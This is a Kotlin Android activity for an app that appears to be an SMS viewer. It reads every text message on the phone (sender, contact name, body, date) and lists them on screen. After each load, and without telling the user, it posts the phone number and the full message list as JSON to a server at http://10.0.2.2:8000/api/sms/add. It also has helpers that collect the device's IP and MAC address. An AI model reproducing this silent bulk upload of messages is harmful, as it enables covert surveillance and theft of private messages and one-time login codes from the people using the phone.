package com.example.androidsms

import android.content.Context
import android.database.Cursor
import android.database.SQLException
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.Bundle
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.recyclerview.widget.DividerItemDecoration
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.alibaba.fastjson2.JSON
import com.blankj.utilcode.util.LogUtils
import com.blankj.utilcode.util.TimeUtils
import com.example.androidsms.base.LogUtil
import com.example.androidsms.base.SMSUtils
import com.example.androidsms.base.SMSUtils.OnPhoneNumber
import com.example.androidsms.models.SMSInfo
import com.hjq.permissions.Permission
import com.hjq.permissions.XXPermissions
import kotlinx.android.synthetic.main.activity_main.*
import kotlinx.android.synthetic.main.item_sms.view.*
import okhttp3.*
import java.io.IOException
import java.net.InetAddress
import java.net.NetworkInterface
import java.net.SocketException
import java.util.*
import kotlin.collections.ArrayList


class MainActivity : AppCompatActivity() {
    private val smsList = ArrayList<SMSInfo>()
    private val adapterSMS by lazy { SMSAdapter() }
    private var mobile = ""

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        recycler_sms.layoutManager = LinearLayoutManager(this)
        val dividerItemDecoration = DividerItemDecoration(this, DividerItemDecoration.VERTICAL)
        dividerItemDecoration.setDrawable(ContextCompat.getDrawable(this, R.drawable.divider)!!)
        recycler_sms.addItemDecoration(dividerItemDecoration)
        recycler_sms.adapter = adapterSMS

        SMSUtils.getNumber(this
        ) {
            mobile = it
            getSmsList()
        }

        refresh_sms.setOnRefreshListener {
            getSmsList()
        }
    }

    private fun getSmsList() {
        XXPermissions.with(this).permission(Permission.READ_SMS).request { permissions, all ->
            if (all) {
                val smsBuilder = StringBuilder()
                try {
                    val uri: Uri = Uri.parse("content://sms/")
                    val projection = arrayOf("_id", "address", "person", "body", "date", "read", "type")
                    val cur: Cursor? = contentResolver.query(uri, projection, null, null, "date desc")
                    if (cur != null) {
                        // 获取手机内部短信
                        if (cur.moveToFirst()) {
                            val address = cur.getColumnIndex("address")
                            val person = cur.getColumnIndex("person")
                            val body = cur.getColumnIndex("body")
                            val date = cur.getColumnIndex("date")
                            val read = cur.getColumnIndex("read")
                            val type = cur.getColumnIndex("type")
                            smsList.clear()
                            do {
                                val smsInfo = SMSInfo()
                                smsInfo.sender = cur.getString(address)
                                smsInfo.personName = cur.getString(person)
                                smsInfo.content = cur.getString(body)
                                smsInfo.date = cur.getLong(date)
                                smsInfo.isRead = cur.getInt(read) == 1
                                smsInfo.type = cur.getInt(type)
                                smsList.add(smsInfo)
                            } while (cur.moveToNext())
                            adapterSMS.notifyDataSetChanged()
                            if (!cur.isClosed) {
                                cur.close()
                            }
                            postToServer()
                        }
                    }
                } catch (ex: SQLException) {
                    Log.d("SMS", ex.toString())
                }
            }
            refresh_sms.finishRefresh()
        }
    }

    private fun postToServer() {
        val ip = getLocalIpAddress()
        val url = "http://10.0.2.2:8000/api/sms/add"
        val requestBody = FormBody.Builder()
            .add("mobile", mobile)
            .add("list", JSON.toJSONString(smsList))
            .build()

        //创建request请求对象
        val request = Request.Builder()
            .url(url)
            .post(requestBody)
            .build()

        //创建call并调用enqueue()方法实现网络请求
        OkHttpClient().newCall(request)
            .enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e("czl", e.localizedMessage)
                }

                override fun onResponse(call: Call, response: Response) {
                    response.body?.string()?.let { Log.e("czl", it) }
                }
            })
    }
    private fun getLocalIpAddress(): String? {
        try {
            val en: Enumeration<NetworkInterface> = NetworkInterface
                .getNetworkInterfaces()
            while (en.hasMoreElements()) {
                val intf: NetworkInterface = en.nextElement()
                val enumIpAddr: Enumeration<InetAddress> = intf.inetAddresses
                while (enumIpAddr.hasMoreElements()) {
                    val inetAddress: InetAddress = enumIpAddr.nextElement()
                    if (!inetAddress.isLoopbackAddress) {
                        return inetAddress.getHostAddress()?.toString()
                    }
                }
            }
        } catch (ex: SocketException) {
            Log.e("czl", ex.toString())
        }
        return null
    }

    /**
     * 获取Android本机MAC
     *
     * @return
     */
    private fun getLocalMacAddress(): String? {
        try {
            val infos: List<NetworkInterface> =
                Collections.list(NetworkInterface.getNetworkInterfaces())
            for (info in infos) {
                if (info.name != "wlan0") {
                    continue
                }
                val macBytes = info.hardwareAddress
                val macByteList: MutableList<String> = ArrayList()
                for (byt in macBytes) {
                    macByteList.add(String.format("%02X", byt))
                }
                return java.lang.String.join(":", macByteList)
            }
        } catch (e: java.lang.Exception) {
            e.printStackTrace()
        }
        return "00:00:00:00:00:00"
    }

    inner class SMSAdapter : RecyclerView.Adapter<SMSAdapter.SMSViewHolder>() {
        inner class SMSViewHolder(itemView: View): RecyclerView.ViewHolder(itemView)

        override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): SMSViewHolder {
            return SMSViewHolder(LayoutInflater.from(parent.context).inflate(R.layout.item_sms, parent, false))
        }

        override fun onBindViewHolder(holder: SMSViewHolder, position: Int) {
            val info = smsList[position]
            holder.itemView.tv_sender.text = "发件人号码：${info.sender}"
            holder.itemView.tv_person.text = "发件人姓名：${info.personName}"
            holder.itemView.tv_date.text = "发件时间：${TimeUtils.millis2String(info.date)}"
            holder.itemView.tv_content.text = "短信内容：${info.content}"
            holder.itemView.tv_read.text = "是否已读：${info.isRead}"
        }

        override fun getItemCount(): Int = smsList.size
    }
}